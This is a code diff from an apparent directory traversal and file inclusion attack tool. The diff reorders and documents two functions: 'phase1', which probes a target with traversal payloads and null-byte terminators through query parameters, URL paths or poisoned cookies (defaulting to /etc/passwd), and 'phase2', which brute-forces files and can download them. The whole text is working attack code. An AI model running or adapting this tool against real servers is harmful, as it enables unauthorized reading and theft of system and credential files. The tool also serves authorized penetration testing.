@@ -25,6 +25,7 @@ from core.methods.filecheck import filecheck
 from core.methods.loot import download
 
 
+"""prepare request for inpath attack"""
 def inpath(traverse, dir, file, nb, url, url2):
     path=traverse+dir+file+nb+url2
     p = traverse+dir+file+nb
@@ -33,6 +34,7 @@ def inpath(traverse, dir, file, nb, url, url2):
     prep.url = url + path
     return (prep, p)
 
+"""prepare request for query attack"""
 def query(traverse, dir, file, nb, keyword, url, url2):
     query = "?" + keyword + "=" + traverse + dir + file + nb + url2
     p = traverse + dir + file + nb
@@ -41,12 +43,103 @@ def query(traverse, dir, file, nb, keyword, url, url2):
     prep.url = url + query
     return (prep, p)
 
+"""
+[Phase 1]: Vulnerability Analysis
+
+@attack: attack mode (-a ACK)
+@url: target part 1 (-v VIC)
+@url2: target part 2 (-q VIC2)
+@keyword: -p PAM (only for -a 1)
+@cookie: cookiejar for -a 3
+@selected: selected cookie to be poisoned
+@verbose: print 404s?
+@depth: attack depth (-d INT)
+@paylist: payload list (all)
+@file: file to be looked up (-i FIL, default: /etc/passwd)
+"""
+def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file):
+    #resolve issues with inpath attac
+    if not url.endswith("/"):
+        url += "/"
+    payloads = []
+    nullbytes = []
+    s = session()
+    if attack == 3:
+        s.cookies = cookie
+    #initial ping for filecheck
+    con2 = requests.get(url).content
+    for i in paylist:
+        d = 0
+        while d <= depth:
+            traverse=''
+            j=1
+            while j <= d:
+                traverse+=i
+                j+=1
+            requestlist = []
+            if attack == 1:
+                prep, p = query(traverse, "", file, "", keyword, url, url2)
+                r = s.send(prep)
+            elif attack == 2:
+                prep, p = inpath(traverse, "", file, "", url, url2)
+                r = s.send(prep)
+            else:
+                s.cookies.set(selected, traverse + file)
+                p = traverse + file
+                r = s.get(url)
+            requestlist.append((r, p, ""))
+            for nb in nullchars:
+                if attack == 1:
+                    prep, p = query(traverse, "", file, nb, keyword, url, url2)
+                    r = s.send(prep)
+                elif attack == 2:
+                    prep, p = inpath(traverse, "", file, nb, url, url2)
+                    r = s.send(prep)
+                else:
+                    s.cookies.set(selected, traverse + file + nb)
+                    p = traverse + file + nb
+                    r = s.get(url)
+                requestlist.append((r, p, nb))
+            found = False
+            for (r, p, nb) in requestlist:
+                if str(r.status_code).startswith("2") or r.status_code == 302 or (r.status_code == 403 and attack != 2):
+                    if filecheck(r, con2, p):
+                        payloads.append(i)
+                        if nb != "":
+                            nullbytes.append(nb)
+                        found = True
+                        print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
+            d+=1
+            if found:
+                break
+    
+    return (payloads, nullbytes)
+
+"""
+[Phase 2]: Exploitation
+
+@attack: attack mode (-a ACK)
+@url: target part 1 (-v VIC)
+@url2: target part 2 (-q VIC2)
+@keyword: -p PAM (only for -a 1)
+@cookie: cookiejar for -a 3
+@selected: selected cookie to be poisoned
+@files: file list created from -l FIL ...
+@dirs: directory list (permutation level based on -d INT)
+@depth: attack depth (-d INT)
+@verbose: print 404s?
+@dl: download found files?
+@selected_payloads: payloads selected in phase 1
+@selected_nullbytes: terminators selected in phase 1
+"""
 def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, verbose, dl, selected_payloads, selected_nullbytes):
+    #resolve issues with inpath attack and loot function
     if not url.endswith("/"):
         url += "/"
     found=[]
     urls = []
     s = session()
+    #initial ping for filecheck
     con2 = requests.get(url).content
     for dir in dirs:
         for file in files:
@@ -120,59 +213,3 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                 print(color.RD+"{}|: ".format(r.status_code)+color.END+color.RC+r.url+color.END)
                 d+=1
     return (found, urls)
-
-def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist, file):
-    if not url.endswith("/"):
-        url += "/"
-    payloads = []
-    nullbytes = []
-    s = session()
-    if attack == 3:
-        s.cookies = cookie
-    con2 = requests.get(url).content
-    for i in paylist:
-        d = 0
-        while d <= depth:
-            traverse=''
-            j=1
-            while j <= d:
-                traverse+=i
-                j+=1
-            requestlist = []
-            if attack == 1:
-                prep, p = query(traverse, "", file, "", keyword, url, url2)
-                r = s.send(prep)
-            elif attack == 2:
-                prep, p = inpath(traverse, "", file, "", url, url2)
-                r = s.send(prep)
-            else:
-                s.cookies.set(selected, traverse + file)
-                p = traverse + file
-                r = s.get(url)
-            requestlist.append((r, p, ""))
-            for nb in nullchars:
-                if attack == 1:
-                    prep, p = query(traverse, "", file, nb, keyword, url, url2)
-                    r = s.send(prep)
-                elif attack == 2:
-                    prep, p = inpath(traverse, "", file, nb, url, url2)
-                    r = s.send(prep)
-                else:
-                    s.cookies.set(selected, traverse + file + nb)
-                    p = traverse + file + nb
-                    r = s.get(url)
-                requestlist.append((r, p, nb))
-            found = False
-            for (r, p, nb) in requestlist:
-                if str(r.status_code).startswith("2") or r.status_code == 302 or (r.status_code == 403 and attack != 2):
-                    if filecheck(r, con2, p):
-                        payloads.append(i)
-                        if nb != "":
-                            nullbytes.append(nb)
-                        found = True
-                        print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
-            d+=1
-            if found:
-                break
-    
-    return (payloads, nullbytes)
